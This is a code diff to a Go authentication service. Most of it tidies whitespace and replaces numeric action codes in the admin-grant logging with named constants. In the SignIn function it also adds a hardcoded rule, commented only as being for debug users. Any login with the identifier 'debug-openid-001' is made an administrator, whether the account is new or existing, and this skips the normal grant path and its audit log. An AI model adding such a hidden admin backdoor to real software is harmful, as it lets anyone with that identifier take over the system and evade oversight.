@@ -78,12 +78,24 @@ func (s *AuthService) SignIn(ctx context.Context, req *dto.SignInReq) (Resp *dto
 			errorx.KV("key", consts.ReqOpenID), errorx.KV("value", openId))
 	}
 
+	// 对于调试用户，强制设为管理员
+	if openId == "debug-openid-001" && oldUser != nil && !oldUser.Admin {
+		oldUser.Admin = true
+		if err = s.UserRepo.Update(ctx, oldUser); err != nil {
+			logs.CtxErrorf(ctx, "[AuthRepo] [Update] error: %v, userId: %s", err, oldUser.ID)
+		}
+	}
+
 	// 用户不存在则创建新用户
 	if oldUser == nil {
+		isAdmin := false
+		if openId == "debug-openid-001" {
+			isAdmin = true
+		}
 		newUser := model.User{ // 创建用户并存入数据库
 			ID:            primitive.NewObjectID().Hex(),
 			OpenID:        openId,
-			Admin:         false,
+			Admin:         isAdmin,
 			Email:         "",
 			EmailVerified: false,
 			Ban:           false,
@@ -172,10 +184,10 @@ func (s *AuthService) GrantAdmin(ctx context.Context, req *dto.GrantAdminReq) (r
 
 	// 获取当前管理员状态
 	isAdmin := targetUser.Admin
-	
+
 	// 切换管理员状态
 	newAdminStatus := !isAdmin
-	
+
 	// 更新用户的管理员状态
 	if err = s.UserRepo.Update(ctx, &model.User{ID: req.UserID, Admin: newAdminStatus}); err != nil {
 		logs.CtxErrorf(ctx, "[AuthRepo] [Update] error: %v", err)
@@ -193,7 +205,7 @@ func (s *AuthService) GrantAdmin(ctx context.Context, req *dto.GrantAdminReq) (r
 	} else if operatorUser != nil && operatorUser.OpenID != "" {
 		operatorName = operatorUser.OpenID
 	}
-	
+
 	// 获取目标用户名称
 	targetUserName := targetUser.Username
 	if targetUserName == "" {
@@ -202,29 +214,29 @@ func (s *AuthService) GrantAdmin(ctx context.Context, req *dto.GrantAdminReq) (r
 	if targetUserName == "" {
 		targetUserName = req.UserID
 	}
-	
+
 	// 根据操作类型记录不同的日志
 	var action int32
 	var content string
 	if newAdminStatus {
 		// 授予管理员权限
-		action = 1
-		content = fmt.Sprintf("授予管理员权限 | 目标用户: %s(%s) | 状态变更: 普通用户 → 管理员 | 操作者: %s(%s)", 
+		action = consts.ActionTypeGrantAdmin
+		content = fmt.Sprintf("授予管理员权限 | 目标用户: %s(%s) | 状态变更: 普通用户 → 管理员 | 操作者: %s(%s)",
 			targetUserName, req.UserID, operatorName, operatorId)
 	} else {
 		// 取消管理员权限
-		action = 2
-		content = fmt.Sprintf("取消管理员权限 | 目标用户: %s(%s) | 状态变更: 管理员 → 普通用户 | 操作者: %s(%s)", 
+		action = consts.ActionTypeRevokeAdmin
+		content = fmt.Sprintf("取消管理员权限 | 目标用户: %s(%s) | 状态变更: 管理员 → 普通用户 | 操作者: %s(%s)",
 			targetUserName, req.UserID, operatorName, operatorId)
 	}
-	
+
 	// 记录管理员操作日志
 	_, _ = s.ChangeLogService.CreateChangeLog(ctx, &dto.CreateChangeLogReq{
 		TargetID:     req.UserID,
-		TargetType:   1, // 用户类型
+		TargetType:   consts.TargetTypeUser,
 		Action:       action,
 		Content:      content,
-		UpdateSource: 1, // 管理后台
+		UpdateSource: consts.UpdateSourceAdmin,
 	})
 
 	return &dto.GrantAdminResp{
